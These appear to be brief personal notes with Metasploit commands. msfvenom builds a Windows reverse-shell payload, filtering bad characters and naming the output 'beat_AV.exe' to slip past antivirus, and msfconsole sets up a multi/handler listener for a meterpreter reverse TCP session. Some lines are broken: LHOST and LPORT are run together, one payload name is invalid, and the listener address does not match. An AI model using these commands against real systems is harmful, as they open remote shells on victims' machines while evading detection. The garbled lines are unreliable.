```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.4LPORT=4444 -f c -b \x00\x0a\x0d -o beat_AV.exe
```
msfvenom -p windows/rshell_reverse_tcp LHOST=192.168.2.4 LPORT=4444
![[Pasted image 20221130120651.png]]

root@bt:~# msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.1.4
set LPORT 4444
exploit